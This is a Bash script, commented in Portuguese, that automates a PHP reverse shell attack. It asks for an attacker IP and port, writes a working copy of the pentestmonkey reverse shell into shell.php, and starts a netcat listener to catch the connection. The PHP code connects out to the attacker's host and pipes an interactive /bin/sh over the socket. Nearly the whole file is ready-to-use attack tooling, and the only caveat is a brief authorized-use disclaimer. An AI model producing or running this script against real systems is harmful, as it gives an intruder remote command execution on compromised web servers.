#!/bin/bash

# ==============================================================================
# PWN.SH - Script para Automatizar a Criação e Execução de um PHP Reverse Shell
#
# Autor: Seu Nome (ou Pseudônimo)
# Versão: 1.0
#
# Este script automatiza os passos para configurar e iniciar um ouvinte
# para o popular reverse shell em PHP do pentestmonkey.
#
# Aviso Legal: Use apenas para fins educacionais e em ambientes autorizados.
# ==============================================================================

# --- Cores para a Saída ---
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m' # Sem Cor

# --- Banner ---
echo -e "${BLUE}=====================================================${NC}"
echo -e "${BLUE}     PHP Reverse Shell Automator (pwn.sh)            ${NC}"
echo -e "${BLUE}=====================================================${NC}"
echo

# --- Coleta de Informações do Usuário ---
read -p "$(echo -e ${YELLOW}'➡️  Insira o seu IP de ouvinte (LHOST): '${NC})" LHOST
read -p "$(echo -e ${YELLOW}'➡️  Insira a sua Porta de ouvinte (LPORT): '${NC})" LPORT

# Validação básica de entrada
if [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
    echo -e "${RED}[!] Erro: O IP e a Porta não podem estar vazios.${NC}"
    exit 1
fi

# Validação adicional para verificar se a porta é um número
if ! [[ "$LPORT" =~ ^[0-9]+$ ]] || [ "$LPORT" -lt 1 ] || [ "$LPORT" -gt 65535 ]; then
    echo -e "${RED}[!] Erro: A porta deve ser um número válido entre 1 e 65535.${NC}"
    exit 1
fi

echo
echo -e "${GREEN}[+] Configurando o LHOST para: ${LHOST}${NC}"
echo -e "${GREEN}[+] Configurando o LPORT para: ${LPORT}${NC}"
echo

# --- Criação do Arquivo shell.php ---
SHELL_FILENAME="shell.php"

# Usando um 'Here Document' para criar o arquivo PHP
cat > $SHELL_FILENAME <<- EOM
<?php
// php-reverse-shell by pentestmonkey
set_time_limit (0);
\$ip = '${LHOST}';
\$port = ${LPORT};
\$chunk_size = 1400;
\$write_a = null;
\$error_a = null;
\$shell = 'uname -a; w; id; /bin/sh -i';
\$daemon = 0;
\$debug = 0;

if (function_exists('pcntl_fork')) {
    \$pid = pcntl_fork();
    if (\$pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    if (\$pid) {
        exit(0);
    }
    if (function_exists('posix_setsid')) {
        if (posix_setsid() == -1) {
            printit("Error: Can't setsid()");
        }
    }
    \$daemon = 1;
} else {
    printit("WARNING: Failed to fork. Not daemonising. This is quite common and not fatal.");
}

chdir("/");
umask(0);

\$sock = fsockopen(\$ip, \$port, \$errno, \$errstr, 30);
if (!\$sock) {
    printit("\$errstr (\$errno)");
    exit(1);
}

\$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "w")
);

\$process = proc_open(\$shell, \$descriptorspec, \$pipes);
if (!is_resource(\$process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

stream_set_blocking(\$pipes[0], 0);
stream_set_blocking(\$pipes[1], 0);
stream_set_blocking(\$pipes[2], 0);
stream_set_blocking(\$sock, 0);

printit("Successfully opened reverse shell to \$ip:\$port");

while (1) {
    if (feof(\$sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    \$read_a = array(\$sock, \$pipes[1], \$pipes[2]);
    \$num_changed_sockets = stream_select(\$read_a, \$write_a, \$error_a, null);

    if (in_array(\$sock, \$read_a)) {
        \$input = fread(\$sock, \$chunk_size);
        fwrite(\$pipes[0], \$input);
    }

    if (in_array(\$pipes[1], \$read_a)) {
        \$input = fread(\$pipes[1], \$chunk_size);
        fwrite(\$sock, \$input);
    }

    if (in_array(\$pipes[2], \$read_a)) {
        \$input = fread(\$pipes[2], \$chunk_size);
        fwrite(\$sock, \$input);
    }
}

fclose(\$pipes[0]);
fclose(\$pipes[1]);
fclose(\$pipes[2]);
fclose(\$sock);
proc_close(\$process);

function printit (\$string) {
    if (!\$daemon) {
        print "\$string\n";
    }
}
?>
EOM

echo -e "${GREEN}[+] Arquivo ${SHELL_FILENAME} criado com sucesso!${NC}"
echo

# --- Verifica se o netcat está instalado ---
if ! command -v nc >/dev/null 2>&1; then
    echo -e "${RED}[!] Erro: Netcat não está instalado. Instale-o para iniciar o ouvinte.${NC}"
    exit 1
fi

# --- Inicia o ouvinte com netcat ---
echo -e "${YELLOW}[*] Iniciando o ouvinte na porta ${LPORT}...${NC}"
echo -e "${YELLOW}[*] Use o arquivo ${SHELL_FILENAME} no alvo para conectar ao ouvinte.${NC}"
echo

nc -lvnp $LPORT

# --- Mensagem Final ---
echo
echo -e "${BLUE}[*] Ouvinte finalizado. Verifique se a conexão foi estabelecida.${NC}"
echo -e "${BLUE}[*] Lembre-se: Use este script apenas em ambientes autorizados!${NC}"
